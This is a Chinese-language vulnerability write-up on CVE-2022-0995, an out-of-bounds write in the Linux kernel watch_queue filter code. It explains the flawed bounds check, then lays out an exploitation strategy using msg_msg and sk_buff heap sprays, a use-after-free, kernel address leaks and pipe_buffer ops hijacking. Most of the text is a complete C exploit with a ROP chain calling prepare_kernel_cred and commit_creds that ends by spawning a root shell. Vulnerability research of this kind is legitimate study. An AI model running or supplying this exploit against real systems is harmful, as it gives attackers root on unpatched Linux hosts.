# CVE-2022-0995


CONFIG_WATCH_QUEUE 啟用的情況下，kernel 資料會存到 pipe_buffer

watch queue 是一段buffer， user 用api調用 struct watch_queue *get_watch_queue(int fd) & void put_watch_queue(struct watch_queue *wqueue)

建好watch queue後，user 用 filter 來限制接收的事件，然後傳入watch_notification_filter -> watch_notification_type_filter


函式調用順序:
ioctl -> vfs_ioctl() -> pipe_ioctl() -> watch_queue_set_filter() -> __set_bit()



```
long watch_queue_set_filter(struct pipe_inode_info *pipe,
			    struct watch_notification_filter __user *_filter)
{
	struct watch_notification_type_filter *tf;
	struct watch_notification_filter filter;
	struct watch_type_filter *q;
	struct watch_filter *wfilter;
	struct watch_queue *wqueue = pipe->watch_queue;
	int ret, nr_filter = 0, i;
	...
	if (copy_from_user(&filter, _filter, sizeof(filter)) != 0)		
		return -EFAULT;
	if (filter.nr_filters == 0 ||
	    filter.nr_filters > 16 ||
	    filter.__reserved != 0)
		return -EINVAL;

	tf = memdup_user(_filter->filters, filter.nr_filters * sizeof(*tf));  
	...
	for (i = 0; i < filter.nr_filters; i++) {
		if ((tf[i].info_filter & ~tf[i].info_mask) ||
		    tf[i].info_mask & WATCH_INFO_LENGTH)
			goto err_filter;
		/* Ignore any unknown types */
		if (tf[i].type >= sizeof(wfilter->type_filter) * 8)  // 檢查存入type大小
			continue;
		nr_filter++;
	}

	... 
	wfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);
    
	...
	wfilter->nr_filters = nr_filter;

	q = wfilter->filters;
	for (i = 0; i < filter.nr_filters; i++) { 				
    
		if (tf[i].type >= sizeof(wfilter->type_filter) * BITS_PER_LONG)	 //檢查存入type大小
			continue;

		q->type			= tf[i].type;						
        
		q->info_filter		= tf[i].info_filter;
		q->info_mask		= tf[i].info_mask;
		q->subtype_filter[0]	= tf[i].subtype_filter[0];
		__set_bit(q->type, wfilter->type_filter);			
        
		q++;
	}
	...
}



#define BITS_PER_LONG 64
#define BIT_MASK(nr)		(UL(1) << ((nr) % BITS_PER_LONG))
#define BIT_WORD(nr)		((nr) / BITS_PER_LONG)
static inline void __set_bit(int nr, volatile unsigned long *addr)
{
	unsigned long mask = BIT_MASK(nr);				 
    
	unsigned long *p = ((unsigned long *)addr) + BIT_WORD(nr);	

	*p  |= mask;
}

```

傳入的watch_notification_type_filter會檢查兩次，首先先確定記憶體大小，第二次存入memoey；但兩次的條件不同，第一次條件為type < 0x80，第二次為type < 0x400

故當type 在 0X80 ~ 0X400 之間，存入 filter 會大於 buffer 大小，則
`__set_bit(q->type, wfilter->type_filter);	`
出現overflow

![](https://hackmd.io/_uploads/Hk_42I3g6.png)
> https://xz.aliyun.com/t/11168#toc-10

可call ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &filter) 觸發漏洞




當一個watch_queue 創建後，便可用一組filters限制接收的資料：

```
struct  watch_notification_filter  { 
        __u32    nr_filters ; 
        __u32    __reserved ; 
        struct  watch_notification_type_filter  filters []; 
};
```

watch_notification_type_filte:

```
struct  watch_notification_type_filter  { 
        __u32    type ; 
        __u32    info_filter ; 
        __u32    info_mask ; 
        __u32    subtype_filter [ 8 ]; 
};
```

寫入buffer的條件
```
( watch . info  &  info_mask )  ==  info_filter
```




## exploit

首先使用`msg_msg` (雙向linked list 結構)，創4096個 message queue 後分別送兩次 message，第一條大小為96的 primary messages，第二條大小為1024的 secondary messages

```
struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;        /* message text size */
    struct msg_msgseg *next;
    void *security;
    /* the actual message follows immediately */
};
```

primary message 中每 1024 讀出一條， 再使用 ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &filter) 觸發 heap spray，造成 msg_msg->m_list.next 被修改，即相鄰的 next pointer 的一個 bit 從 0 變 1，之後使用 msgrcv()找到其位置


接著放出對應的 secondary message 造成 use after free


再 leak 該 UAF　的位置，使用　16*128 sk_buff　進行 heap spray

其中 sk_buff 類似 msg_msg

![](https://hackmd.io/_uploads/Hk8Bqw2g6.png)



然後放掉 sk_sk_buff 並 heap spray， 第二條 primary message msg_msg->m_ts 改為 0xfd0，並進行 OOB read，leak 相鄰的 primary messages 位址

再釋放sk_buff 後 heap spray ， 將 sg_msg->m_ts 設為 0x1fc8， msg_msg->next 設為leak 出的位址 ，便可leak 該位置 msg_msg->m_list.next (即對應的secondary messages)

接著為取得kernel 的位址，需對 pipe_buffer  heap spray

```
struct  pipe_buffer  { 
    struct  page  * page ; const struct pipe_buf_operations * ops ; unsigned
              
     int  flags ; 
    unsigned  long  private ; 
};
```

釋放sk_buff後再heap spray sk_buff，修改第一條 secondary message :
```
msg_msg->m_list.next = msg_msg->m_list.prev = B+0x800；
msg_msg->type = 0x1337；
msg_msg->m_ts = 0xfd0；
msg_msg->next = msg_msg->security = 0
```

pipe_buffer heap spray，收 sk_buff 封包，讀出pipe_buffer 上資料，leak kernel address


最後 sk_buff heap spray ， 觸發 `pipe_buffer->pipe_buffer_operations->release`，利用 leak 出的位址放 ROP


```
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <linux/watch_queue.h>
#include <sys/syscall.h>

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE    0x41
#define SECONDARY_MSG_TYPE  0x42
#define VICTIM_MSG_TYPE     0x1337
#define MSG_TAG     0xAAAAAAAA

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 256
#define MSG_QUEUE_NUM 4096

#define ANON_PIPE_BUF_OPS 0xffffffff82241f00-0xffffffff81000000         // ffffffff82241f00 r anon_pipe_buf_ops
#define PREPARE_KERNEL_CRED 0xffffffff810d3770-0xffffffff81000000       // ffffffff810d3770 T prepare_kernel_cred
#define INIT_CRED 0xffffffff8286e720-0xffffffff81000000                 // ffffffff8286e720 D init_cred
#define COMMIT_CREDS 0xffffffff810d3220-0xffffffff81000000              // ffffffff810d3220 T commit_creds
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e0100b-0xffffffff81000000 // ffffffff81e00ff0 T swapgs_restore_regs_and_return_to_usermode   0xffffffff81e0100b <common_interrupt_return+27>:	mov    rdi,rsp
#define POP_RDI_RET 0xffffffff81052f27-0xffffffff81000000               // 0xffffffff81052f27: pop rdi; ret;
#define PUSH_RSI_JMP_QWORD_PTR_RSI_39 0xffffffff8174c21c-0xffffffff81000000 // 0xffffffff8174c21c: push rsi; jmp qword ptr [rsi + 0x39]; 
#define POP_RSP_RET 0xffffffff8107b900-0xffffffff81000000               // 0xffffffff8107b900: pop rsp; ret;
#define ADD_RSP_A0_POP_POP_RET 0xffffffff8137da1a-0xffffffff81000000    // 0xffffffff8137da1a: add rsp, 0xa0; pop r12; pop rbp; ret; 
#define MOV_RDI_RAX_POP_POP_RET 0xffffffff8102bee1 - 0xffffffff81000000 // 0xffffffff8102bee1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+]保存狀態");
}

struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg
{
    uint64_t    next;
};

struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

// sizeof(struct skb_shared_info) = 0x140     1024-0x140 = 704
char fake_secondary_msg[704];

struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

void errExit(char *msg)
{
    printf("[-] Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    *(long*)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
}

void buildMsg(struct msg_msg *msg, uint64_t m_list_next,
    uint64_t m_list_prev, uint64_t m_type, uint64_t m_ts, 
    uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

int spray_skbuff(int ss[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) 
    for (int j = 0; j < SK_BUFF_NUM; j++)
      if (write(ss[i][0], buf, size) < 0) {
        perror("[-] sk_buff write");
        return -1;
      }
  return 0;
}

int free_skbuff(int ss[SOCKET_NUM][2], void *buf, size_t size) {
  for (int i = 0; i < SOCKET_NUM; i++) 
    for (int j = 0; j < SK_BUFF_NUM; j++) 
      if (read(ss[i][1], buf, size) < 0) {
        perror("[-] sk_buff read");
        return -1;
      }
  return 0;
}

void get_shell(void)
{
    if (getuid())
        errExit("無法取得 root");
    printf("[+] 取得 root\n");
    syscall(SYS_execve, "/bin/sh", 0, 0);
}

void oob_write(int pipe_fd[2])
{
    struct watch_notification_filter *wfilter;
    unsigned int nfilters;
    
    nfilters = 4;
    wfilter = (struct watch_notification_filter*)
            calloc(1, sizeof(struct watch_notification_filter)
                + nfilters * sizeof(struct watch_notification_type_filter));
    wfilter->nr_filters = nfilters;

    // normal filter
    for (int i = 0; i < (nfilters - 1); i++)
        wfilter->filters[i].type = 1;
    
    // evil filter
    // 0x300 = 8 * 96 bytes
    // 1 << 0xa = 0x400, maybe we can hit a proper bit
    wfilter->filters[nfilters - 1].type = 0x30a;

    // 觸發 oob write
    if (ioctl(pipe_fd[0], IOC_WATCH_QUEUE_SET_FILTER, wfilter) < 0)
        errExit("無法使用 ioctl IOC_WATCH_QUEUE_SET_FILTER");
    
    // prevent memory leak in userspace(no need in fact)
    free(wfilter);
}


void build_krop(char *buf, uint64_t kbase_addr) {
  uint64_t *rop;
  *(uint64_t *)&buf[0x39] = kbase_addr + POP_RSP_RET;                           // pop rsp; ret;
  *(uint64_t *)&buf[0x00] = kbase_addr + ADD_RSP_A0_POP_POP_RET;                        // add rsp, 0xd0; ret; 

  rop = (uint64_t *)&buf[0xA8];

  *rop++ = 0xDEADBEEF;
  *rop++ = 0xDEADBEEF;
  *rop++ = kbase_addr + POP_RDI_RET;
  *rop++ = 0; // RDI
  *rop++ = kbase_addr + PREPARE_KERNEL_CRED;
  *rop++ = kbase_addr + MOV_RDI_RAX_POP_POP_RET;
  *rop++ = 0xDEADBEEF;
  *rop++ = 0xDEADBEEF;
  *rop++ = kbase_addr + COMMIT_CREDS;
  *rop++ = kbase_addr + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;
  *rop++ = 0xDEADBEEF;
  *rop++ = 0xDEADBEEF;
  *rop++ = (uint64_t)get_shell;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp & 0xffffffffffffff00;
  *rop++ = user_ss;
}

int main(int argc, char **argv, char **envp)
{
    int         oob_pipe_fd[2];
    int         sk_sockets[SOCKET_NUM][2];
    int         pipe_fd[PIPE_NUM][2];
    int         msqid[MSG_QUEUE_NUM];
    int         victim_qid, real_qid;
    struct msg_msg  *nearby_msg;
    struct msg_msg  *nearby_msg_prim;
    struct pipe_buffer *pipe_buf_ptr;
    struct pipe_buf_operations *ops_ptr;
    uint64_t    victim_addr;
    uint64_t    kernel_base;
    uint64_t    kernel_offset;
    uint64_t    *rop_chain;
    int         rop_idx;
    cpu_set_t   cpu_set;

    save_status();

// 0. 設置 affinity , 創建漏洞 pipe 和 sk_buff  socket
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    //  觸發 off-by-null 的 pipe
    if (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) < 0)
        errExit("無法創建 O_NOTIFICATION_PIPE");
    
    // spray sk_buff 的 socket
    for (int i = 0; i < SOCKET_NUM; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0)
            errExit("無法創建 O_NOTIFICATION_PIPE");
// 1. spray 4096 msg_msg：kmalloc-96 <-> kmalloc-1024
    puts("[+] 1. spray 4096 msg_msg:  kmalloc-96 <-> kmalloc-1024");
    puts("[*] Build message queue...");
    // 1-1. build 4096 message queue
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("無法創建 msg_queue");
    }

    puts("[*] Spray primary and secondary msg_msg...");
    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    // 1-2. spray primary & secondary message
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("無法送出 primary msg");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
            errExit("無法送出 send secondary msg");
    }
// 2. 觸發 OOB
    // 2-1. create 4 hole in primary msg_msg
    puts("[+] 2. Trigger OOB");
    puts("[*] Create 4 holes in primary msg_msg...");
    for (int i = 0; i < MSG_QUEUE_NUM; i += 1024)
    {
        if (readMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("無法 receive primary msg");
    }

    // 2-2. triger off-by-null on primary msg_msg
    puts("[*] Trigger OOB write to construct the overlapping...");
    oob_write(oob_pipe_fd);

    // 2-3 找到相同 secondary msg_msg 的 queue
    puts("[*] Checking whether succeeded to make overlapping...");
    victim_qid = real_qid = -1;
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((i % 1024) == 0)  // the hole
            continue;

        if (peekMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), 1) < 0)
        {
            printf("[x] error qid: %d\n", i);
            errExit("無法接收secondary msg");
        }

     
        if (*(int*) &secondary_msg.mtext[4] != i)
        {
            victim_qid = i;
            real_qid = *(int*) &secondary_msg.mtext[4];
            break;
        }
    }

    if (victim_qid < 0)
        errExit("failed to make overlapping!");
    
    printf("[+] victim qid: %d   real qid: %d\n", 
            victim_qid, real_qid);

// 3. 創建 UAF
    puts("[+] 3. 創建 UAF");

    // 放出 victim secondary msg_msg, 取得UAF
    if (readMsg(msqid[real_qid], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
        errExit("無法接收secondary msg");

// 4. spray sk_buff 以 leak msg_msg addr，然後創 msg_msg 以 leak UAF obj addr
    puts("[+] 4. spray sk_buff 以 leak kheap addr");

    // 4-1 spray sk_buff 創 msg_msg
    puts("[*] spray sk_buff...");
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"bsauce00", *(uint64_t*)"bsauce00", 
            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
    if (spray_skbuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("無法 spray sk_buff");
    
    // 4-2 用創建的 msg_msg 觸發 read OOB
    puts("[*] OOB read from victim msg_msg");
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("無法讀取 victim msg");
    
    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
        errExit("無法再次命中 UAF object");

    nearby_msg = (struct msg_msg*) 
            &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
    
    printf("[+] addr of primary msg of msg nearby victim: %llx\n", 
            nearby_msg->m_list.prev);

    // 4-3 spray sk_buff 創 msg_msg, 讀 primary msg_msg 以 leak second msg_msg
    if (free_skbuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("無法放出 sk_buff");
    
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"bsauce00", *(uint64_t*)"bsauce00", 
            VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
            nearby_msg->m_list.prev - 8, 0);
    if (spray_skbuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("無法 spray sk_buff");
    
    puts("[*] arbitrary read on primary msg of msg nearby victim");
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("無法 read victim msg");
    
    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
        errExit("無法再次命中 UAF object");
    
    // 4-4 cal the addr of UAF obj by the header we just read out
    nearby_msg_prim = (struct msg_msg*) 
            &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;
    
    printf("[+] addr of msg next to victim: %llx\n", 
            nearby_msg_prim->m_list.next);
    printf("[+] addr of msg UAF object: %llx\n", victim_addr);

// 5. fix the header of UAF obj and release it, spray pipe_buffer and leak the kernel base
    puts("[+] 5. spray pipe_buffer 以 leak kernel base");

    // 5-1 再創建 msg_msg
    puts("[*] fixing the UAF obj as a msg_msg...");
    if (free_skbuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("無法 release sk_buff");
    
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            victim_addr + 0x800, victim_addr + 0x800, // a valid kheap addr is valid
            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
            0, 0);
    if (spray_skbuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("無法 spray sk_buff");
    
    // 5-2 release UAF obj as secondary msg
    puts("[*] release UAF obj in message queue...");
    if (readMsg(msqid[victim_qid], &secondary_msg, 
                sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
        errExit("無法receive secondary msg");
    
    // 5-3 spray pipe_buffer
    puts("[*] spray pipe_buffer");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            errExit("無法創建pipe");
        
        // write something to activate it
        if (write(pipe_fd[i][1], "bsauce00", 8) < 0)
            errExit("無法寫入pipe");
    }

    // 5-4 放出 sk_buff 以讀取 pipe_buffer, leak kernel base
    puts("[*] release sk_buff to read pipe_buffer");
    pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
    for (int i = 0; i < SOCKET_NUM; i++)
    {
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            if (read(sk_sockets[i][1], &fake_secondary_msg, 
                    sizeof(fake_secondary_msg)) < 0)
                errExit("無法放出 sk_buff");
            
            if (pipe_buf_ptr->ops > 0xffffffff81000000)
            {
                printf("[+] got anon_pipe_buf_ops: %llx\n", 
                        pipe_buf_ptr->ops);
                kernel_base = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
            }
        }
    }
    printf("[+] kernel base: %llx\n", kernel_base);
    
// 6. hijack the ops of pipe_buffer, fre e allpipe to hijack the RIP, 將ROP置於pipe_buffer
    puts("[+] 6. hijack pipe_buffer, 取得 root");

    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
    pipe_buf_ptr->ops = victim_addr + 0x290;
    ops_ptr = (struct pipe_buf_operations *) (fake_secondary_msg+0x290);
    ops_ptr->release = kernel_base + PUSH_RSI_JMP_QWORD_PTR_RSI_39;

    build_krop(fake_secondary_msg, kernel_base);

    puts("[*] spray sk_buff ");
    if (spray_skbuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff");
    
    puts("[*] trigger fake ops->release to hijack RIP...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
}
```


ref:
https://bsauce.github.io/2022/04/15/CVE-2022-0995/
https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
